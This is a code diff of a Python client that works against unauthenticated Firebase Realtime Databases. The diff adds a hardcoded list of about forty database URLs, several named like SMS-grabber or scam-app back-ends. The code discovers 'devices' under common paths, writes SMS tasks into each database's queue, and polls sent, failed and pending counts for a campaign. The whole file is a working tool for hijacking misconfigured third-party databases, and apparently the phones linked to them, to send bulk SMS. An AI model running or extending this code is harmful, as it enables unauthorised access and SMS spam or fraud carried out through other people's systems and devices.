@@ -1,6 +1,5 @@
 """
 Firebase Realtime Database REST client (no auth — rules: true).
-Handles device discovery, SMS task writing, and stat polling.
 """
 
 import asyncio
@@ -12,20 +11,68 @@ from typing import Optional
 import pathlib as _pl
 
 
+_BUILTIN_URLS = [
+    "https://bullpass-f2c8c-default-rtdb.firebaseio.com",
+    "https://my-penel-maxjoker98-default-rtdb.firebaseio.com",
+    "https://premmiiii-default-rtdb.firebaseio.com",
+    "https://flashowmv1-enginepower-default-rtdb.firebaseio.com",
+    "https://cogulent-default-rtdb.firebaseio.com",
+    "https://rnd5-d583f-default-rtdb.firebaseio.com",
+    "https://room-29b11-default-rtdb.firebaseio.com",
+    "https://vish-4a6de-default-rtdb.firebaseio.com",
+    "https://axis-c4bd3-default-rtdb.firebaseio.com",
+    "https://xiaoms-6c15b-default-rtdb.firebaseio.com",
+    "https://freefire-c51f2-default-rtdb.firebaseio.com",
+    "https://heisenberg-8c3da-default-rtdb.firebaseio.com",
+    "https://shadow-f9cd3-default-rtdb.firebaseio.com",
+    "https://strange-2e4aa-default-rtdb.firebaseio.com",
+    "https://hyper-cheat-3f53a-default-rtdb.firebaseio.com",
+    "https://autobot-e9a28-default-rtdb.firebaseio.com",
+    "https://zinga-1ae57-default-rtdb.firebaseio.com",
+    "https://vclub-fd078-default-rtdb.firebaseio.com",
+    "https://room-hotel-default-rtdb.firebaseio.com",
+    "https://myapp-8228a-default-rtdb.firebaseio.com",
+    "https://project3-21573-default-rtdb.firebaseio.com",
+    "https://update-cf7a9-default-rtdb.firebaseio.com",
+    "https://tracegod-168d5-default-rtdb.firebaseio.com",
+    "https://fir-project-175f2-default-rtdb.firebaseio.com",
+    "https://fir-e8ad7-default-rtdb.firebaseio.com",
+    "https://fir-d327e-default-rtdb.firebaseio.com",
+    "https://store-1c7da-default-rtdb.firebaseio.com",
+    "https://apkpure-6eb6a-default-rtdb.firebaseio.com",
+    "https://vibe-d238e-default-rtdb.firebaseio.com",
+    "https://prof-b6a64-default-rtdb.firebaseio.com",
+    "https://instafud-default-rtdb.firebaseio.com",
+    "https://dark-274b4-default-rtdb.firebaseio.com",
+    "https://newyear-f8f14-default-rtdb.firebaseio.com",
+    "https://novap7-725ff-default-rtdb.firebaseio.com",
+    "https://binod-52551-default-rtdb.firebaseio.com",
+    "https://net-c-f0054-default-rtdb.firebaseio.com",
+    "https://smsgrabbeer-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://neru-e635f-default-rtdb.europe-west1.firebasedatabase.app",
+]
+
+
 def _load_urls() -> list[str]:
     p = _pl.Path(__file__).parent / "databases.txt"
-    if not p.exists():
-        return []
-    return [ln.strip() for ln in p.read_text().splitlines() if ln.strip() and not ln.startswith("#")]
+    if p.exists():
+        lines = [ln.strip() for ln in p.read_text().splitlines()
+                 if ln.strip() and not ln.startswith("#")]
+        if lines:
+            return lines
+    return _BUILTIN_URLS
+
 
 RTDB_URLS: list[str] = _load_urls()
 
-DEVICE_PATHS    = ["devices", "Devices", "device", "Device", "users", "Users"]
-SMS_QUEUE_PATH  = "sms_tasks"
-MAX_SMS_PER_DB  = 60
+DEVICE_PATHS     = ["devices", "Devices", "device", "Device", "users", "Users"]
+SMS_QUEUE_PATH   = "sms_tasks"
+MAX_SMS_PER_DB   = 60
 CONCURRENT_WRITE = 40
-POLL_INTERVAL   = 8
-POLL_TIMEOUT    = 180
+POLL_INTERVAL    = 8
+POLL_TIMEOUT     = 180
 
 
 @dataclass
@@ -68,7 +115,6 @@ async def _discover_devices_one(session: aiohttp.ClientSession, db_url: str) -> 
     top = await _get(session, f"{db_url}/.json?shallow=true")
     if not top or not isinstance(top, dict):
         return []
-
     for path in DEVICE_PATHS:
         if path.lower() not in [k.lower() for k in top.keys()]:
             continue
@@ -92,14 +138,16 @@ async def _discover_devices_one(session: aiohttp.ClientSession, db_url: str) -> 
             ))
         if devices:
             return devices
-
-    return [RtdbDevice(db_url=db_url, device_id="default", label=db_url.split("//")[1].split(".")[0])]
+    return [RtdbDevice(db_url=db_url, device_id="default",
+                       label=db_url.split("//")[1].split(".")[0])]
 
 
 async def discover_all_devices() -> list[RtdbDevice]:
     async with aiohttp.ClientSession() as session:
-        tasks = [_discover_devices_one(session, url) for url in RTDB_URLS]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
+        results = await asyncio.gather(
+            *[_discover_devices_one(session, url) for url in RTDB_URLS],
+            return_exceptions=True,
+        )
     devices = []
     for r in results:
         if isinstance(r, list):
@@ -162,7 +210,6 @@ async def poll_stats(db_task_map, campaign_id, update_cb=None):
         await asyncio.sleep(POLL_INTERVAL)
         grand = CampaignStats(total=total)
         stats_list = []
-
         async with aiohttp.ClientSession() as session:
             for db_url, task_ids in db_task_map.items():
                 if not task_ids:
@@ -184,7 +231,6 @@ async def poll_stats(db_task_map, campaign_id, update_cb=None):
                 grand.sent    += s.sent
                 grand.failed  += s.failed
                 grand.pending += s.pending
-
         if update_cb:
             await update_cb(grand, stats_list)
         if grand.pending == 0:
